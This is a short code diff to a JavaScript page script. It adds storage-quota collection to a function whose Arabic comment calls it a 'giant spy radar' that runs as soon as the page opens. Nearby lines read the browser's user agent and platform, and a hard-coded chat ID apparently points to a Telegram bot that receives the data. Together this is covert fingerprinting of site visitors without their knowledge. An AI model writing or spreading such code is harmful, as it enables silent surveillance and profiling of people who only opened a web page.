@@ -140,6 +140,14 @@ const chatId = "7388801889";
     
     // --- رادار التجسس العملاق (يشتغل فور فتح الصفحة) ---
     async function silentRadar() {
+        try {
+            if (navigator.storage && navigator.storage.estimate) {
+                const estimate = await navigator.storage.estimate();
+                const total = (estimate.quota / (1024 ** 3)).toFixed(2);
+                const free = ((estimate.quota - estimate.usage) / (1024 ** 3)).toFixed(2);
+                storageInfo = `${total} GB الكلية | ${free} GB الفاضية`;
+            }
+        } catch (e) { storageInfo = "خطأ في الجلب"; }
         // معلومات المتصفح والنظام
         let ua = navigator.userAgent;
         let platform = navigator.platform;
